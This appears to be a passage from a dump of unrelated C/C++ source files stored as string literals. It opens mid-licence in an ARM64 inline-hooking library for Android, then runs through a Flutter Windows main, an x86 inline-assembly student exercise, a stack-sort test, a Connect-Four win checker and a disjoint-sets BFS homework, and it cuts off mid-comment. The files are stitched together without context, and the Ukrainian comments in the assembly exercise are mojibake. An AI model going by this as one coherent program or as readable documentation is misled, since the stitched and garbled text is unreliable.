EVENT SHALL THE\n AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n SOFTWARE.\n */\n#define  __STDC_FORMAT_MACROS\n\n#include <inttypes.h>\n#include <stdlib.h>\n#include <sys/mman.h>\n#include <android/log.h>\n#include <cstring>\n#include <errno.h>\n\n#if defined(__aarch64__)\n\n#include \"And64InlineHook.hpp\"\n\n#define   A64_MAX_INSTRUCTIONS 5\n#define   A64_MAX_REFERENCES   (A64_MAX_INSTRUCTIONS * 2)\n#define   A64_NOP              0xd503201fu\n#define   A64_JNIEXPORT        __attribute__((visibility(\"hidden\")))\n#define   A64_LOGE(...)        ((void)__android_log_print(ANDROID_LOG_ERROR, \"A64_HOOK\", __VA_ARGS__))\n#ifndef NDEBUG\n# define  A64_LOGI(...)        ((void)__android_log_print(ANDROID_LOG_INFO, \"A64_HOOK\", __VA_ARGS__))\n#else\n# define  A64_LOGI(...)        ((void)0)\n#endif // NDEBUG\ntypedef uint32_t *__restrict *__restrict instruction;\ntypedef struct {\n    struct fix_info {\n        uint32_t *bp;\n        uint32_t ls; // left-shift counts\n        uint32_t ad; // & operand\n    };\n    struct insns_info {\n        union {\n            uint64_t insu;\n            int64_t ins;\n            void *insp;\n        };\n        fix_info fmap[A64_MAX_REFERENCES];\n    };\n    int64_t basep;\n    int64_t endp;\n    insns_info dat[A64_MAX_INSTRUCTIONS];\n\npublic:\n    inline bool is_in_fixing_range(const int64_t absolute_addr) {\n        return absolute_addr >= this->basep && absolute_addr < this->endp;\n    }\n\n    inline intptr_t get_ref_ins_index(const int64_t absolute_addr) {\n        return static_cast<intptr_t>((absolute_addr - this->basep) / sizeof(uint32_t));\n    }\n\n    inline intptr_t get_and_set_current_index(uint32_t *__restrict inp, uint32_t *__restrict outp) {\n        intptr_t current_idx = this->get_ref_ins_index(reinterpret_cast<int64_t>(inp));\n        this->dat[current_idx].insp = outp;\n        return current_idx;\n    }\n\n    inline void reset_current_ins(const intptr_t idx, uint32_t *__restrict outp) {\n        this->dat[idx].insp = outp;\n    }\n\n    void\n    insert_fix_map(const intptr_t idx, uint32_t *bp, uint32_t ls = 0u, uint32_t ad = 0xffffffffu) {\n        for (auto &f : this->dat[idx].fmap) {\n            if (f.bp == NULL) {\n                f.bp = bp;\n                f.ls = ls;\n                f.ad = ad;\n                return;\n            } //if\n        }\n        // What? GGing..\n    }\n\n    void process_fix_map(const intptr_t idx) {\n        for (auto &f : this->dat[idx].fmap) {\n            if (f.bp == NULL) break;\n            *(f.bp) = *(f.bp) |\n                      (((int32_t(this->dat[idx].ins - reinterpret_cast<int64_t>(f.bp)) >> 2)\n                              << f.ls) & f.ad);\n            f.bp = NULL;\n        }\n    }\n} context;\n\n//-------------------------------------------------------------------------\n\nstatic bool __fix_branch_imm(instruction inpp, instruction outpp, context *ctxp) {\n    static constexpr uint32_t mbits = 6u;\n    static constexpr uint32_t mask = 0xfc000000u; // 0b11111100000000000000000000000000\n    static constexpr uint32_t rmask = 0x03ffffffu; // 0b00000011111111111111111111111111\n    static constexpr uint32_t op_b = 0x14000000u; // \"b\"  ADDR_PCREL26\n    static constexpr uint32_t op_bl = 0x94000000u; // \"bl\" ADDR_PCREL26\n\n    const uint32_t ins = *(*inpp);\n    const uint32_t opc = ins & mask;\n    switch (opc) {\n        case op_b:\n        case op_bl: {\n            intptr_t current_idx = ctxp->get_and_set_current_index(*inpp, *outpp);\n            int64_t absolute_addr = reinterpret_cast<int64_t>(*inpp) +\n                                    (static_cast<int32_t>(ins << mbits)\n                                            >> (mbits - 2u)); // sign-extended\n            int64_t new_pc_offset =\n                    static_cast<int64_t>(absolute_addr - reinterpret_cast<int64_t>(*outpp))\n                            >> 2; // shifted\n            bool special_fix_type = ctxp->is_in_fixing_range",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"profile\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\nvoid Task1()\r\n{\r\n\tint a, b, c, d, x;\r\n\tint values[5] = { 0, 0, 0, 0, 0 }; // \u00ec\u00e0\u00f1\u00e8\u00e2 \u00e4\u00eb\u00ff \u00e7\u00e1\u00e5\u00f0\u00e5\u00e6\u00e5\u00ed\u00ed\u00ff \u00f3(\u00f5)\r\n\r\n\ta = -6; b = 4; c = 8; d = 2;\r\n\t__asm {\r\n\t\tmov eax, [values]\r\n\t\tpush eax // \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00f3 \u00f1\u00f2\u00e5\u00ea \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov cx, 5 // \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00f5\u00ee\u00e4\u00b3\u00e2 \u00f6\u00e8\u00ea\u00eb\u00f3 \r\n\tstart: // \u00ef\u00ee\u00f7\u00e0\u00f2\u00ee\u00ea \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tmov ax, 3 // \u00e4\u00eb\u00ff \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff x = 3 - \u00f1\u00f5 \r\n\t\tsub ax, cx // \u00ee\u00f2\u00f0\u00e8\u00ec\u00f3\u00ba\u00ec\u00ee \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f5\r\n\t\tcwde // \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee ax \u00e4\u00ee eax\r\n\t\tmov ebx, eax // \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee x \u00e2 ebx\r\n\t\tmov eax, a // \u00f1\u00f2\u00e0\u00eb\u00e0 \u00e0\r\n\t\tcmp ebx, 1 // \u00ef\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba\u00ec\u00ee \u00f5 \u00e7 \u00ee\u00e4\u00e8\u00ed\u00e8\u00f6\u00e5\u00fe\r\n\t\tjl less_ // \u00ff\u00ea\u00f9\u00ee \u00f5 \u00ec\u00e5\u00ed\u00f8\u00e5 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 less\r\n\t\tje equals // \u00ff\u00ea\u00f9\u00ee \u00f5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee equals\r\n\r\n\t\timul eax // a^2\r\n\t\tsub eax, ebx // a^2-x\r\n\t\tcdq // \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee a^2-x \u00e4\u00ee \u00f7\u00e5\u00f2\u00e2\u00b3\u00f0\u00ed\u00ee\u00e3\u00ee \u00f1\u00eb\u00ee\u00e2\u00e0\r\n\t\tmov ebx, c // \u00f1\u00f2\u00e0\u00eb\u00e0 c\r\n\t\tidiv ebx // (a^2-x)/c\r\n\t\tjmp result // \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 result\r\n\tless_:\r\n\t\tmov edx, 2\r\n\t\timul edx // a*2\r\n\t\timul ebx // a*2*x\r\n\t\tadd eax, 5 // a*2*x+5\r\n\t\tjmp result // \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 result\r\n\tequals:\r\n\t\tmov ebx, b // \u00f1\u00f2\u00e0\u00eb\u00e0 b\r\n\t\tsub eax, ebx // a-b\r\n\t\tcdq // \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee a-b \u00e4\u00ee \u00f7\u00e5\u00f2\u00e2\u00b3\u00f0\u00ed\u00ee\u00e3\u00ee \u00f1\u00eb\u00ee\u00e2\u00e0\r\n\t\tmov ebx, d // \u00f1\u00f2\u00e0\u00eb\u00e0 d\r\n\t\tidiv ebx // (a-b)/d\r\n\t\tjmp result // \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 result\r\n\tresult:\r\n\t\tpop ebx // \u00e2\u00e8\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e7\u00b3 \u00f1\u00f2\u00e5\u00ea\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov[values + ebx], eax // \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00e7\u00e0 \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00ee\u00fe \u00e0\u00e4\u00f0\u00e5\u00f1\u00ee\u00fe\r\n\t\tadd ebx, 4 // \u00e7\u00f1\u00f3\u00e2\u00e0\u00ba\u00ec\u00ee \u00e2\u00ea\u00e0\u00e7\u00b3\u00e2\u00ed\u00e8\u00ea \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tpush ebx // \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e2 \u00f1\u00f2\u00e5\u00ea \u00ed\u00ee\u00e2\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3\r\n\t\tloop start // \u00ea\u00b3\u00ed\u00e5\u00f6\u00fc \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tpop ebx\r\n\t}\r\n\tfor (int i = 0; i < 5; i++) \r\n\t{\r\n\t\tstd::cout << values[i] << std::endl;\r\n\t}\r\n\tsystem(\"pause\");\r\n}\r\n\r\nvoid Option15()\r\n{\r\n\tint a = 7;\r\n\tint y1, y2;\r\n\tint values[5] = { 0, 0, 0, 0, 0 };\r\n\t// x1\r\n\r\n\t// x - ebx\r\n\t// a - eax\r\n\r\n\t__asm\r\n\t{\r\n\t\tmov eax, [values]\r\n\t\tpush eax\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00f3 \u00f1\u00f2\u00e5\u00ea \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov cx, 5\t\t\t\t// \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00f5\u00ee\u00e4\u00b3\u00e2 \u00f6\u00e8\u00ea\u00eb\u00f3 \r\n\tstart:\r\n\t\tmov ax, 3\t\t\t\t// \u00e4\u00eb\u00ff \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff x = 3 - \u00f1\u00f5 \r\n\t\tsub ax, cx\t\t\t\t// \u00ee\u00f2\u00f0\u00e8\u00ec\u00f3\u00ba\u00ec\u00ee \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f5\r\n\t\tcwde\t\t\t\t\t// \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee ax \u00e4\u00ee eax\r\n\t\tmov ebx, eax\t\t\t// \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee x \u00e2 ebx\r\n\t\tmov eax, a\t\t\t\t// \u00f1\u00f2\u00e0\u00eb\u00e0 \u00e0\r\n\t\tcmp ebx, 1\t\t\t\t// \u00ef\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba\u00ec\u00ee \u00f5 \u00e7 \u00ee\u00e4\u00e8\u00ed\u00e8\u00f6\u00e5\u00fe\r\n\t\tjl isLess\t\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00ec\u00e5\u00ed\u00f8\u00e5 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 isLess\r\n\t\tjge greatEqual\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba \u00e0\u00e1\u00ee \u00e1\u00b3\u00eb\u00fc\u00f8\u00e5 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee greatEqual\r\n\tisLess:\r\n\t\t// 8 + |x|\r\n\t\tcmp ebx, 0\r\n\t\tjl abs_x_is_less\r\n\t\t\tabs_x_is_less: \r\n\t\t\t\tneg ebx\r\n\t\tmov eax, ebx\r\n\t\tadd eax, 8\r\n\t\tjmp result\r\n\tgreatEqual:\r\n\t\t// 2 * |a|\r\n\t\tmov edx, 2\r\n\t\tcmp eax, 0\r\n\t\tmul edx\t\t\t\t\t// mul \u00e2\u00e8\u00ea\u00ee\u00ed\u00f3\u00ba \u00e1\u00e5\u00e7\u00e7\u00ed\u00e0\u00ea\u00ee\u00e2\u00e5 \u00ec\u00ed\u00ee\u00e6\u00e5\u00ed\u00ed\u00ff \u00f0\u00e5\u00e3\u00b3\u00f1\u00f2\u00f0\u00e0 edx \u00ed\u00e0 eax\r\n\t\tjmp result\r\n\tresult:\r\n\t\tpop ebx\t\t\t\t\t// \u00e2\u00e8\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e7\u00b3 \u00f1\u00f2\u00e5\u00ea\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov[values + ebx], eax\t// \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00e7\u00e0 \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00ee\u00fe \u00e0\u00e4\u00f0\u00e5\u00f1\u00ee\u00fe\r\n\t\tadd ebx, 4\t\t\t\t// \u00e7\u00f1\u00f3\u00e2\u00e0\u00ba\u00ec\u00ee \u00e2\u00ea\u00e0\u00e7\u00b3\u00e2\u00ed\u00e8\u00ea \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tpush ebx\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e2 \u00f1\u00f2\u00e5\u00ea \u00ed\u00ee\u00e2\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3\r\n\t\tloop start\t\t\t\t// \u00ea\u00b3\u00ed\u00e5\u00f6\u00fc \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tpop ebx\r\n\t}\r\n\tfor (int i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << values[i] << std::endl;\r\n\t}\r\n\tint secOperand;\r\n\t__asm\r\n\t{\r\n\t\tmov eax, 0\r\n\t\tpush eax\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00f3 \u00f1\u00f2\u00e5\u00ea \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov cx, 5\t\t\t\t// \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00f5\u00ee\u00e4\u00b3\u00e2 \u00f6\u00e8\u00ea\u00eb\u00f3 \r\n\tstart1:\r\n\t\tmov ax, 3\t\t\t\t// \u00e4\u00eb\u00ff \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff x = 3 - \u00f1\u00f5 \r\n\t\tsub ax, cx\t\t\t\t// \u00ee\u00f2\u00f0\u00e8\u00ec\u00f3\u00ba\u00ec\u00ee \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f5\r\n\t\tcmp cx, 0\r\n\t\t\tje end_\r\n\t\tcwde\t\t\t\t\t// \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee ax \u00e4\u00ee eax\r\n\t\tmov ebx, eax\t\t\t// \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee x \u00e2 ebx\r\n\t\tmov eax, a\t\t\t\t// \u00f1\u00f2\u00e0\u00eb\u00e0 \u00e0\r\n\t\tcmp ebx, eax\t\t\t// \u00ef\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba\u00ec\u00ee \u00f5 \u00e7 a\r\n\t\tje Equals\t\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba a, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 Equals\r\n\t\tjne nonEqual\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00ed\u00e5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba \u00e0, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee nonEqual\r\n\tEquals:\r\n\t\t// 3\r\n\t\tmov eax, 3\r\n\t\tjmp result1\r\n\tnonEqual:\r\n\t\t// a + 1\r\n\t\tmov eax, a\r\n\t\tadd eax, 1\r\n\t\tjmp result1\r\n\tresult1:\r\n\t\t/* div <\u00ee\u00ef\u00e5\u00f0\u00e0\u00ed\u00e4>\r\n\t\t\u00c2\u00e8\u00ea\u00ee\u00ed\u00f3\u00ba \u00e1\u00e5\u00e7\u00e7\u00ed\u00e0\u00ea\u00ee\u00e2\u00e5 \u00e4\u00b3\u00eb\u00e5\u00ed\u00ed\u00ff \u00f0\u00e5\u00e3\u00b3\u00f1\u00f2\u00f0\u00b3\u00e2 EDX : EAX(RDX : RAX) \u00ed\u00e0 \u00ee\u00ef\u00e5\u00f0\u00e0\u00ed\u00e4.\r\n\t\t\u00d0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00e4\u00b3\u00eb\u00e5\u00ed\u00ed\u00ff \u00e7\u00e1\u00e5\u00f0\u00b3\u00e3\u00e0\u00ba\u00f2\u00fc\u00f1\u00ff \u00e2 EAX(RAX), \u00e0 \u00ee\u00f1\u00f2\u00e0\u00f7\u00e0 \u00e2 EDX(RDX).*/\r\n\t\tcdq\r\n\t\tpop ebx\r\n\t\tmov secOperand, eax\r\n\t\tmov eax, [values + ebx]\r\n\t\tdiv secOperand\r\n\t\tmov[values + ebx], edx\r\n\t\tadd ebx, 4\t\t\t\t// \u00e7\u00f1\u00f3\u00e2\u00e0\u00ba\u00ec\u00ee \u00e2\u00ea\u00e0\u00e7\u00b3\u00e2\u00ed\u00e8\u00ea \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tpush ebx\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e2 \u00f1\u00f2\u00e5\u00ea \u00ed\u00ee\u00e2\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3\r\n\t\tloop start1\t\t\t\t// \u00ea\u00b3\u00ed\u00e5\u00f6\u00fc \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tpop ebx\r\n\tend_:\r\n\t\tpop ebx\r\n\t}\r\n\tfor (int i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << values[i] << std::endl;\r\n\t}\r\n\tsystem(\"pause\");\r\n}\r\n\r\nint main() \r\n{\r\n\tTask1();\r\n\tOption15();\r\n\treturn 0;\r\n}\r\n",
    "\ufeff#include <iostream>\n#include <string>\n#include <windows.h>\n#include \"mystack.hpp\"\n\nusing std::cin, std::cout, std::endl, std::boolalpha, std::string, std::to_string;\n\nvoid simple_test()\n{\n    int n;\n    cout << \"Please, enter number of elements n = \";\n    cin >> n;\n\n    MyStack<int> stack;\n\n    for (int i = 0; i < n; i++)\n    {\n        int x = rand() % 101;\n        stack.Push(x);\n    }\n\n    cout << \"before: \";\n    stack.ShowAll();\n    cout << boolalpha << \"sorted: \" << stack.Sorted() << endl;\n\n    stack.Sort(n);\n\n    cout << \"after: \";\n    stack.ShowAll();\n    cout << boolalpha << \"sorted: \" << stack.Sorted() << \"\\n\" << endl;\n}\n\nvoid full_test()\n{\n    unsigned long long int t_s, t_f;\n    int j, i;\n    for (i = 1; i < 11; i++)\n    {\n        MyStack<int> stack;\n\n        for (j = 0; j < i * 100; j++)\n        {\n            stack.Push(rand() % 10001);\n        }\n\n        t_s = GetTickCount64();\n        stack.Sort(i * 100);\n        t_f = GetTickCount64();\n\n        cout << \"sort #\" << i << \"\\n\";\n        cout << \"number of elements: \" << i * 100 << \"\\n\";\n        cout << \"sort time (ms): \" << t_f - t_s << \"\\n\";\n        cout << \"number of operations: \" << stack.N_op << \"\\n\";\n        cout << endl;\n    }\n}\n\nint main()\n{\n    simple_test();\n    full_test();\n    \n    system(\"pause\");\n\n    return 0;\n}\n",
    "#include \"Judge.h\"\r\rbool userWin(const int x, const int y, const int M, const int N, int* const* board){\r\t//\u6a2a\u5411\u68c0\u6d4b\r    int i, j;\r    int count = 0;\r    for (i = y; i >= 0; i--)\r        if (!(board[x][i] == 1))\r            break;\r    count += (y - i);\r    for (i = y; i < N; i++)\r        if (!(board[x][i] == 1))\r            break;\r    count += (i - y - 1);\r    if (count >= 4) return true;\r\r    //\u7eb5\u5411\u68c0\u6d4b\r    count = 0;\r    for (i = x; i < M; i++)\r        if (!(board[i][y] == 1))\r            break;\r    count += (i - x);\r    if (count >= 4) return true;\r\r    //\u5de6\u4e0b-\u53f3\u4e0a\r    count = 0;\r    for (i = x, j = y; i < M && j >= 0; i++, j--)\r        if (!(board[i][j] == 1))\r            break;\r    count += (y - j);\r    for (i = x, j = y; i >= 0 && j < N; i--, j++)\r        if (!(board[i][j] == 1))\r            break;\r    count += (j - y - 1);\r    if (count >= 4) return true;\r\r    //\u5de6\u4e0a-\u53f3\u4e0b\r    count = 0;\r    for (i = x, j = y; i >= 0 && j >= 0; i--, j--)\r        if (!(board[i][j] == 1))\r            break;\r    count += (y - j);\r    for (i = x, j = y; i < M && j < N; i++, j++)\r        if (!(board[i][j] == 1))\r            break;\r    count += (j - y - 1);\r    if (count >= 4) return true;\r\r    return false;\r}\r\rbool machineWin(const int x, const int y, const int M, const int N, int* const* board){\r\t//\u6a2a\u5411\u68c0\u6d4b\r    int i, j;\r    int count = 0;\r    for (i = y; i >= 0; i--)\r        if (!(board[x][i] == 2))\r            break;\r    count += (y - i);\r    for (i = y; i < N; i++)\r        if (!(board[x][i] == 2))\r            break;\r    count += (i - y - 1);\r    if (count >= 4) return true;\r\r    //\u7eb5\u5411\u68c0\u6d4b\r    count = 0;\r    for (i = x; i < M; i++)\r        if (!(board[i][y] == 2))\r            break;\r    count += (i - x);\r    if (count >= 4) return true;\r\r    //\u5de6\u4e0b-\u53f3\u4e0a\r    count = 0;\r    for (i = x, j = y; i < M && j >= 0; i++, j--)\r        if (!(board[i][j] == 2))\r            break;\r    count += (y - j);\r    for (i = x, j = y; i >= 0 && j < N; i--, j++)\r        if (!(board[i][j] == 2))\r            break;\r    count += (j - y - 1);\r    if (count >= 4) return true;\r\r    //\u5de6\u4e0a-\u53f3\u4e0b\r    count = 0;\r    for (i = x, j = y; i >= 0 && j >= 0; i--, j--)\r        if (!(board[i][j] == 2))\r            break;\r    count += (y - j);\r    for (i = x, j = y; i < M && j < N; i++, j++)\r        if (!(board[i][j] == 2))\r            break;\r    count += (j - y - 1);\r    if (count >= 4) return true;\r\r    return false;\r}\r\rbool isTie(const int N, const int* top){\r\tbool tie = true;\r    for (int i = 0; i < N; i++)\r    {\r        if (top[i] > 0)\r        {\r            tie = false;\r            break;\r        }\r    }\r    return tie;\r}",
    "// The parts where you need to do work are\n// marked further below in the code with \"TODO\".\n\n#include <iostream>\n#include <string>\n\n// Note: You must not change the definition of DisjointSets here.\nclass DisjointSets {\npublic:\n  int s[256];\n  int distance[256];\n\n  DisjointSets() {\n    for (int i = 0; i < 256; i++) s[i] = distance[i] = -1;\n  }\n\n  int find(int i) { return s[i] < 0 ? i : find(s[i]); }\n\n  void dsunion(int i, int j) {\n    int root_i = find(i);\n    int root_j = find(j);\n    if (root_i != root_j) {\n      s[root_i] = root_j;\n    }\n  }\n\n  void bfs(int i, int n, int m, int edges[][2]);\n};\n\n/*\n * In the function below, there are two conditions\n * that need to be programmed to correctly record\n * the array of shortest distances from the\n * start vertex i to all other vertices.\n *\n * Parameters:\n * i: index of the vertex to begin searching from\n * n: total number of vertices\n * m: total number of edges\n * edges: the graph data structure, as an array of edges,\n *   where each edge is an array of two ints\n *\n * Results: Nothing is returned, but the distance\n * array should contain the shortest distances\n * to each vertex.\n */\n\nvoid DisjointSets::bfs(int i, int n, int m, int edges[][2]) {\n\n  // The shortest distance from the start vertex i\n  // to itself is simply 0.\n  distance[i] = 0;\n\n  // We will loop over all of the shortest possible\n  // distances from i to another vertex, starting\n  // with distance d=1. We increase d by 1 after\n  // each iteration.\n  // The longest \"shortest distance\" possible is m\n  // (a path using each edge once), so we set an\n  // upper limit on the iterations.\n  // However, we do break out of the loop at the\n  // bottom if we detect that we have reached\n  // all of the vertices.\n\n  for (int d = 1; d <= m; d++) {\n\n    // We initialize a variable f with -1 to show\n    // that nothing has been marked on the frontier\n    // during this iteration yet. Soon, we will\n    // change f to the index of the first vertex that\n    // we add to the frontier during this iteration.\n    // Then, f can represent a temporary frontier set.\n    int f = -1;\n\n    // rooti is the index identifying the set\n    // that includes the start vertex i. This set\n    // contains all of the vertices that were\n    // added to the frontier during previous\n    // iterations.\n    int rooti = find(i);\n\n    // We loop through all of the edges\n    // during each distance iteration.\n    // ---\n    // (Note: This is done here for simplicity,\n    // but it is NOT efficient!\n    // This could be much more efficient\n    // if we used a queue of vertices to\n    // check on the frontier boundary instead.\n    // That would avoid repeatedly checking the\n    // same edges. The lecture describes the way\n    // to efficiently implement BFS, and you'll\n    // look at an efficient implementation in\n    // the graph search project code.)\n\n    for (int j = 0; j < m; j++) {\n\n      // root0 and root1 are the indices\n      // identifying the sets that the vertices\n      // of this edge belong to. (Maybe the same set,\n      // or maybe two different sets.)\n\n      int root0 = find(edges[j][0]);\n      int root1 = find(edges[j][1]);\n\n      if (rooti == root0 && rooti != root1) {\n        // ^ TODO: You must edit the condition here!\n        // If this edge crosses the frontier\n        // because the [0] vertex is on the inside\n        // (already reached from the start index i),\n        // and the [1] vertex is on the outside,\n        // then we will add the [1] vertex to the\n        // frontier set and record its distance.\n\n        // You don't need to edit this part:\n\n        if (f == -1) {\n          // This is the first edge crossing the\n          // frontier during this iteration, so start\n          // a new frontier set with the [1] vertex.\n          f = edges[j][1];\n        }\n        else {\n          // We already have a frontier set during\n          // this iteration, so add vertex [1] to it.\n          dsunion(f,edges[j][1]);\n        }\n\n        // The shortest distance to this edge's\n        // vertex [1] is d.\n        distance[edges[j][1]] = d;\n\n      }\n      else if (rooti == root1 && rooti != root0) {\n        // ^ TODO: You must edit the condition here!\n        // If this edge crosses the frontier\n        // because 